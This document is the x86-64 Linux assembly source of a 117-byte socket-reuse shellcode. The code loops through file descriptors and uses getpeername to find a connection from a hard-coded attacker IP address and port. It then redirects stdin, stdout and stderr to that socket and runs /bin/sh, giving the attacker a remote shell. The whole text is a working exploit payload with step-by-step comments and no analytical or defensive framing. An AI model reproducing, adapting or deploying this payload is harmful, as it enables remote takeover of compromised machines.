# 117 bytes
.section .data
.section .text
.globl _start
_start:
jmp start

exit:
  push $0x3c
  pop %rax
  syscall

start:
  push $0x02
  pop %rdi

make_fd_struct:
  lea -0x14(%rsp), %rdx
  movb $0x10, (%rdx)
  lea 0x4(%rdx), %rsi # move struct into rsi

loop:
  inc %edi
  test %di, %di # loop until 65535 then exit
  je exit

stack_fix:
  lea 0x14(%rdx), %rsp

get_peer_name:
  sub $0x20, %rsp
  push $0x34
  pop %rax
  syscall

check_pn_success:
  test %al, %al
  jne loop

# If we make it here, rbx and rax are 0
check_ip:
  push $0x1b
  pop %rcx
  mov $0xfeffff80, %ebx
#  not %ebx
  cmpl %ebx, (%rsp,%rcx,4)      
  jne loop

check_port:
  movb $0x35, %cl
  mov $0x2dfb, %bx
#  not %bx
  cmpw %bx,(%rsp, %rcx ,2) # (%rbp,%rsi,2)
  jne loop

reuse:
  push %rax
  pop %rsi

  dup_loop:       # redirect stdin, stdout, stderr to socket
    push $0x21
    pop %rax
    syscall
    inc %esi
    cmp $0x4, %esi
    jne dup_loop

execve:
  pop %rdi
  push %rdi                      
  push %rdi
  pop %rsi                     
  pop %rdx                       # Null out %rdx and %rdx (second and third argument)
  mov $0x68732f6e69622f6a,%rdi   # move 'hs/nib/j' into %rdi
  shr $0x8,%rdi                  # null truncate the backwards value to '\0hs/nib/'
  push %rdi      
  push %rsp 
  pop %rdi                       # %rdi is now a pointer to '/bin/sh\0'
  push $0x3b                     
  pop %rax                       # set %rax to function # for execve()
  syscall                        # execve('/bin/sh',null,null);
